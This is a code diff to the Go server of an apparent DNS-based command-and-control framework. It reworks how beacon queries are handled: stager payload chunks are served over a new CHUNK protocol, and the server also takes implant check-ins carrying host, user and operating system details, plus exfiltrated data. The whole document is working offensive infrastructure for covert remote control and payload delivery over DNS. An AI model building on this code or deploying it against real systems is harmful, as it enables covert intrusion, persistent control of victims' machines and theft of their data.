@@ -772,12 +772,23 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		}
 		return c2.handleStagerRequest(parts, clientIP, isDuplicate), true
 
-	case "ACK": // Stager acknowledgment
+	case "ACK": // DEPRECATED: Old stager acknowledgment protocol
 		parts := strings.SplitN(decoded, "|", 4) // ACK|chunk_index|IP|session
 		if len(parts) < 2 {
 			return "", false
 		}
 		return c2.handleStagerAck(parts, clientIP, isDuplicate), true
+
+	case "CHUNK": // Stager chunk request (new protocol) OR legacy client chunking
+		parts := strings.SplitN(decoded, "|", 6)
+		if len(parts) == 4 {
+			// New stager protocol: CHUNK|index|IP|sessionID
+			return c2.handleStagerAck(parts, clientIP, isDuplicate), true
+		} else if len(parts) >= 6 {
+			// Legacy client chunking protocol
+			return c2.handleChunk(parts), true
+		}
+		return "", false
 
 	case "CHECKIN", "CHK":
 		parts := strings.SplitN(decoded, "|", 5) // CHK|id|host|user|os
@@ -808,13 +819,6 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 			return "", false
 		}
 		return c2.handleData(parts, isDuplicate), true
-
-	case "CHUNK": // DEPRECATED: Legacy single-phase chunking, kept for backward compatibility
-		parts := strings.SplitN(decoded, "|", 6)
-		if len(parts) < 6 {
-			return "", false
-		}
-		return c2.handleChunk(parts), true
 
 	default:
 		// Only log if debug mode (reduces noise from random DNS queries)
@@ -1290,9 +1294,8 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 				sessionInfo.SessionID, sessionInfo.TotalChunks)
 		}
 
-		// Return META response with DNS domains list
-		domainsStr := strings.Join(sessionInfo.DNSDomains, ",")
-		return fmt.Sprintf("META|%d|%s", sessionInfo.TotalChunks, domainsStr)
+		// Return META response with chunk count only (domains compiled into stager)
+		return fmt.Sprintf("META|%d", sessionInfo.TotalChunks)
 	}
 
 	// Standalone mode fallback - use local client binary
